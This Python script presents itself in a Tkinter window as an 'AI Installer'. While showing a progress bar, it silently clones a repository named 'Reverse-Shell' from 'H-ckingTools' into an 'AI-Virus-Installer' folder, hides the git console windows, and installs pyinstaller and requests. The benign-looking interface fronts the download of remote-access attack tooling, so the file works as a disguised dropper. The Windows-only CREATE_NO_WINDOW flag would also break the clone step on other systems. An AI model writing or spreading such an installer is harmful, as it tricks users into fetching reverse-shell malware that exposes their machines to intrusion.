import os
import sys
import subprocess
import threading
import tkinter as tk
from tkinter import ttk
import platform
import shutil
import importlib.util
from typing import List
from urllib.request import urlopen, URLError

# Constants
WINDOW_WIDTH = 500
WINDOW_HEIGHT = 300
REPO_URL = "https://github.com/H-ckingTools/Reverse-Shell.git"
LOCAL_REPO_DIR = "AI-Virus-Installer"
REQUIRED_MODULES = ["pyinstaller", "requests"]
CHECK_INTERNET_URL = "http://www.google.com"
INSTALL_TIMEOUT = 120  # seconds
GIT_TIMEOUT = 180

class AppInstaller:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("AI Installer")
        self.root.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

        self.progress = ttk.Progressbar(self.root, orient="horizontal", length=400, mode="determinate")
        self.progress.pack(pady=20)
        
        self.progress_percent = tk.Label(self.root, text="0%")
        self.progress_percent.pack()

        self.main_label = tk.Label(self.root, text="Initializing...", font=("Helvetica", 14))
        self.main_label.pack(pady=(10, 0))

        self.status_label = tk.Label(self.root, text="", font=("Helvetica", 10))
        self.status_label.pack(pady=(5, 10))

        self.details_text = tk.Text(self.root, height=6, wrap=tk.WORD, state=tk.DISABLED)
        self.details_text.pack(padx=20, pady=5, fill=tk.BOTH, expand=True)

        self.running = True
        self._center_window()

        threading.Thread(target=self._run_installation, daemon=True).start()

    def _on_close(self):
        self.running = False
        self.root.destroy()

    def _run_installation(self):
        try:
            if not self._check_internet_connection():
                raise Exception("No internet connection.")

            git_path = self._ensure_git_installed()
            self._update_repository(git_path)
            self._install_dependencies()

            self._update_progress(100, "Installation Complete", "All components installed successfully.")
            self._log_message("Installation completed successfully!", success=True)

        except Exception as e:
            self._log_message(f"Error: {str(e)}", error=True)
            self._update_progress(0, "Installation Failed", "See error details below.")

    def _install_dependencies(self):
        missing = self._get_missing_modules()
        if not missing:
            self._log_message("All required modules are already installed.")
            self._update_progress(90, "Dependencies Check", "All modules present")
            return

        total = len(missing)
        self._log_message(f"Found {total} missing modules to install: {', '.join(missing)}")
        
        for i, module in enumerate(missing):
            if not self.running:
                break

            progress = 60 + int((i / total) * 40)
            self._update_progress(progress, "Installing Dependencies", f"Installing {module} ({i+1}/{total})")
            self._log_message(f"Installing {module}...")

            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", module],
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=INSTALL_TIMEOUT
                )
                self._log_message(f"Successfully installed {module}", success=True)
            except subprocess.TimeoutExpired:
                self._log_message(f"Timeout while installing {module}", error=True)
            except subprocess.CalledProcessError as e:
                self._log_message(f"Failed to install {module}: {e.stderr.decode().strip()}", error=True)

    def _get_missing_modules(self) -> List[str]:
        return [m for m in REQUIRED_MODULES if not self._is_module_installed(m)]

    def _is_module_installed(self, module_name: str) -> bool:
        try:
            return importlib.util.find_spec(module_name) is not None
        except Exception:
            return False

    def _log_message(self, message: str, error: bool = False, success: bool = False):
        if not self.running:
            return
            
        def append():
            self.details_text.config(state=tk.NORMAL)
            if not hasattr(self, '_tags_configured'):
                self.details_text.tag_config('error', foreground='red')
                self.details_text.tag_config('success', foreground='green')
                self._tags_configured = True
            tag = 'error' if error else 'success' if success else ''
            self.details_text.insert(tk.END, message + '\n', tag)
            self.details_text.config(state=tk.DISABLED)
            self.details_text.see(tk.END)
        self.root.after(0, append)

    def _update_progress(self, value: int, main: str, status: str):
        if not self.running:
            return
        def update():
            self.progress['value'] = value
            self.progress_percent.config(text=f"{int(value)}%")
            self.main_label.config(text=main)
            self.status_label.config(text=status)
        self.root.after(0, update)

    def _center_window(self):
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (WINDOW_WIDTH // 2)
        y = (screen_height // 2) - (WINDOW_HEIGHT // 2)
        self.root.geometry(f'+{x}+{y}')

    def _check_internet_connection(self) -> bool:
        self._update_progress(10, "Checking Requirements", "Verifying internet connection...")
        try:
            with urlopen(CHECK_INTERNET_URL, timeout=5) as response:
                self._log_message("Internet connection verified.")
                return True
        except URLError:
            self._log_message("No internet connection detected.", error=True)
            return False

    def _ensure_git_installed(self) -> str:
        self._update_progress(20, "Checking Requirements", "Looking for Git installation...")
        git_path = shutil.which('git')
        if git_path:
            self._log_message(f"Git found at: {git_path}")
            return git_path

        self._log_message("Git not found. Attempting to install...")
        if platform.system() == "Windows":
            raise Exception("Git is required but not found. Please install Git from https://git-scm.com/")
        else:
            try:
                if platform.system() == "Linux":
                    self._log_message("Installing Git via apt-get...")
                    subprocess.run(['sudo', 'apt-get', 'install', '-y', 'git'], check=True, timeout=300)
                elif platform.system() == "Darwin":
                    self._log_message("Installing Git via Homebrew...")
                    subprocess.run(['brew', 'install', 'git'], check=True, timeout=300)
                git_path = shutil.which('git')
                if git_path:
                    self._log_message("Git installed successfully.")
                    return git_path
                else:
                    raise Exception("Git installation failed.")
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to install Git: {e.stderr.decode().strip()}")
            except subprocess.TimeoutExpired:
                raise Exception("Git installation timed out.")

    def _update_repository(self, git_path: str):
        if os.path.isdir(LOCAL_REPO_DIR) and os.path.isdir(os.path.join(LOCAL_REPO_DIR, ".git")):
            self._update_progress(40, "Updating Application", "Pulling latest changes...")
            self._log_message("Existing repository found. Updating...")
            try:
                subprocess.run(
                    [git_path, 'pull'],
                    cwd=LOCAL_REPO_DIR,
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=GIT_TIMEOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self._log_message("Repository updated successfully.")
                self._update_progress(60, "Repository Updated", "Update complete")
            except subprocess.TimeoutExpired:
                raise Exception("Repository update timed out.")
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to update repository: {e.stderr.decode().strip()}")
        else:
            self._update_progress(30, "Cloning Repository", "Downloading source code...")
            self._log_message("Cloning repository...")
            try:
                subprocess.run(
                    [git_path, 'clone', REPO_URL, LOCAL_REPO_DIR],
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=GIT_TIMEOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self._log_message("Repository cloned successfully.")
                self._update_progress(60, "Repository Cloned", "Download complete")
            except subprocess.TimeoutExpired:
                raise Exception("Repository clone timed out.")
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to clone repository: {e.stderr.decode().strip()}")

AppInstaller().root.mainloop()